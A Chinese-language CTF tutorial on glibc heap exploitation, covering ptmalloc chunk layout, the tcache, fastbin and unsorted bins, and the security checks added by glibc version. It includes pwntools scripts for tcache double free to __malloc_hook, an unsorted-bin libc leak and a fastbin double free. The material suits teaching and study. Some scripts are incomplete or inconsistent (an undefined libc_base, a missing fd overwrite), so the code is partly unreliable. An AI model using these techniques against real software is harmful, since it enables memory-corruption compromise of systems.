# 堆利用基础：ptmalloc / fastbin / tcache / unsorted_bin

## 1. 概述

堆（Heap）是程序运行时动态分配的内存区域。glibc的ptmalloc是Linux下最主流的堆分配器实现，CTF堆题大多基于此。理解堆的数据结构和分配/释放逻辑是堆利用的前提。

在CTF断网离线场景下，掌握各类bin的管理机制和对应的利用技术至关重要。小参数模型可辅助代码理解和利用链推导，但内存布局仍需精确分析。

## 2. 核心原理

### 2.1 Chunk结构

```c
// 已分配chunk (glibc 2.23+)
struct malloc_chunk {
    size_t prev_size;    // 前一个chunk的大小（如果前一个已释放）
    size_t size;         // 当前chunk大小（含标志位）
    // 标志位: PREV_INUSE(bit0) | IS_MMAPPED(bit1) | NON_MAIN_ARENA(bit2)
    struct malloc_chunk* fd;   // 前向指针（仅释放时使用）
    struct malloc_chunk* bk;   // 后向指针（仅释放时使用）
    // ... user data ...
};

// 释放时的fd/bk复用
// fastbin: 仅用fd，单链表
// tcache: 仅用fd(多数情况) + key(检测double free)
// unsorted_bin: fd和bk，双循环链表
// small_bin/large_bin: fd和bk，双循环链表，额外有fd_nextsize/bk_nextsize
```

### 2.2 各类Bins对照表

| Bin类型 | 大小范围 | 数据结构 | 分配顺序 |
|---------|---------|---------|---------|
| tcache (2.26+) | [0x20, 0x410) | 单链表，每个size一个bin，max 7个chunk | 优先于所有bin |
| fastbin | [0x20, 0x80) | 单链表(LIFO)，每个size一个bin | 优先于smallbin |
| smallbin | [0x20, 0x400) | 双循环链表(FIFO)，共62个 | 在unsorted之后 |
| unsorted_bin | 任意大小 | 双循环链表，临时存放刚释放的chunk | 遍历时归类到small/large |
| largebin | [0x400, ∞) | 双链表，含size排序 | 在smallbin之后 |
| top_chunk | 剩余空间 | 单chunk | 最后分配，可分割可扩展 |

### 2.3 关键安全机制演变

| glibc版本 | 新增机制 | 绕过方式 |
|-----------|---------|---------|
| 2.23 (Ubuntu 16.04) | 基本无检查 | 各类经典利用 |
| 2.27 (Ubuntu 18.04) | tcache引入，tcache_entry->key | double free需清除key |
| 2.29 | tcache key检测增强，unlink更多检查 | 需要更精确的伪造 |
| 2.31 (Ubuntu 20.04) | tcache计数检测，largebin attack加固 | tcache stash攻击 |
| 2.34 | tcache安全检查加强，hook移除 | IO_FILE为主要目标 |
| 2.35+ | __malloc_hook/__free_hook移除 | House of Apple等新技术 |

### 3.2 堆漏洞分类

```
1. Heap Overflow        — 写入超出chunk边界
2. Use After Free (UAF) — 释放后继续使用
3. Double Free          — 同一chunk释放两次
4. Off-by-one           — 写入多一个字节（覆盖size的PREV_INUSE]
5. Null byte off-by-one — 多写一个\x00（poison null byte）
```

### 3.3 tcache利用（glibc 2.27+）

```python
# tcache特点：
# 1. 每个bin最多7个chunk（满后进入fastbin）
# 2. 单链表，仅fd指针，取chunk无size检查
# 3. 2.29+增加了key检查防止简单double free

# tcache dup (glibc 2.27)
free(chunk_A)  # tcache: A
free(chunk_A)  # tcache: A -> A (double free成功!)

# tcache dup (glibc 2.29+，需清除key)
free(chunk_A)  # tcache: A (fd=A, key=随机值)
free(chunk_B)  # tcache: B -> A
# UAF修改A的fd为target，然后malloc两次拿到target
edit_A(fd = target_address)
malloc()  # 返回A
malloc()  # 返回target (任意地址分配!)
```

## 4. 常见误区与注意事项

1. **size字段的flags**：`chunk_size = requested_size & ~0x7`，注意低3位是标志位
2. **tcache和fastbin的size范围重叠**：tcache优先级更高，填满7个后才进fastbin
3. **unsorted_bin attack**：2.29+被修复，但largebin attack仍部分有效
4. **堆地址泄露**：unsorted_bin的fd/bk指向main_arena+0xXX，可反推libc基址
5. **对齐要求**：64位chunk size必须16字节对齐，32位8字节对齐

## 5. 实战示例

### 5.1 tcache double free + 任意地址分配

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
tcache double free 实现任意地址分配 (glibc 2.27)
目标：分配chunk到__malloc_hook，写入one_gadget
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./tcache_dup')
elf = ELF('./tcache_dup')

def add(idx, size):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())

def delete(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

# ---- Step 1: 泄露heap地址 ----
add(0, 0x80)
add(1, 0x80)
delete(0)
delete(1)  # unsorted bin形成 -> fd/bk指向main_arena，可泄露libc
# 但0和1被合并，需要heap地址才能继续

add(0, 0x80)  # 重新分配
edit(0, b'X' * 8)  # UAF trigger
delete(0)
# ... (具体泄露因题而异)

# ---- Step 2: tcache dup ----
add(2, 0x50)
add(3, 0x50)
delete(3)
delete(2)  # tcache[0x50]: 2 -> 3
# UAF: edit chunk 2's fd
malloc_hook_addr = 0x7ffff7dcbc30  # libc的__malloc_hook (示例地址)
# 实际需要泄露libc后计算

edit(2, p64(malloc_hook_addr))  # 修改fd指向__malloc_hook
# tcache[0x50]: 2 -> malloc_hook

add(4, 0x50)  # 返回chunk 2
add(5, 0x50)  # 返回malloc_hook! (任意地址分配成功)

# ---- Step 3: 写入one_gadget ----
one_gadget = libc_base + 0x4f3d5
edit(5, p64(one_gadget))

# 触发__malloc_hook（下次malloc时自动调用）
p.sendlineafter(b'>', b'1')
p.sendlineafter(b'idx:', b'6')
p.sendlineafter(b'size:', b'10')
p.interactive()
```

### 5.2 unsorted bin泄露libc

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
利用unsorted bin的fd/bk泄露libc基址
核心原理：大chunk释放后进入unsorted_bin，fd和bk指向main_arena+0x58(32bit)或main_arena+0x60(64bit)
"""
from pwn import *

context.arch = 'amd64'

p = process('./unsorted_leak')

def add(idx, size):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())

def delete(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'idx:', str(idx).encode())
# ---- Step 1: 分配两个大chunk防止合并 ----
add(0, 0x500)  # 实际分配0x510（带上metadata，64位对齐）
add(1, 0x80)   # 屏障chunk，防止top_chunk合并
add(2, 0x500)  # 另一个大chunk

# ---- Step 2: 释放进入unsorted_bin ----
delete(0)
# chunk0 进入 unsorted_bin
# fd = bk = main_arena + 0x60 (指向unsorted_bin的表头)

# ---- Step 3: 利用UAF或其他方式读取 ----
show(0)  # 读取chunk0内容
data = p.recv(6)
libc_leak = u64(data.ljust(8, b'\x00'))
log.info(f'Unsorted bin leak: {hex(libc_leak)}')

# 计算libc基址
# main_arena_offset = libc.symbols['__malloc_hook'] + 0x10  # main_arena在__malloc_hook后0x10
# 或者直接用已知偏移
# unsorted_bin_head = main_arena + 0x60 (64位) 或 + 0x58 (32位)
main_arena_offset = 0x3ebc40  # 示例偏移，用 libc.symbols['__malloc_hook'] + 0x10 计算
libc_base = libc_leak - main_arena_offset - 0x60
log.info(f'libc_base = {hex(libc_base)}')

# 验证（检查libc_base以0x000结尾，即页对齐）
assert libc_base & 0xFFF == 0, "libc_base not page aligned!"
log.success('libc_base leaked successfully!')
p.interactive()
```

### 5.3 fastbin double free (glibc 2.23)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fastbin double free经典利用 (glibc 2.23)
fastbin仅检查链表头部是否为重复free，可利用 A->B->A 模式绕过
"""
from pwn import *

context.arch = 'amd64'

p = process('./fastbin_dup')
elf = ELF('./fastbin_dup')

def add(idx, size):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())

def delete(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

# ---- fastbin dup: A -> B -> A 模式 ----
add(0, 0x60)  # chunk A
add(1, 0x60)  # chunk B
add(2, 0x60)  # 屏障

delete(0)  # fastbin: A
delete(1)  # fastbin: B -> A
delete(0)  # fastbin: A -> B -> A (绕过！因为头部是B)

# 此时分配三次：
# 第1次：返回A（修改A的fd指向target）
# 第2次：返回B  
# 第3次：返回A
# 第4次：返回target
add(3, 0x60)  # A
add(4, 0x60)  # B
add(5, 0x60)  # A again
add(6, 0x60)  # target (任意地址分配)

p.interactive()
```
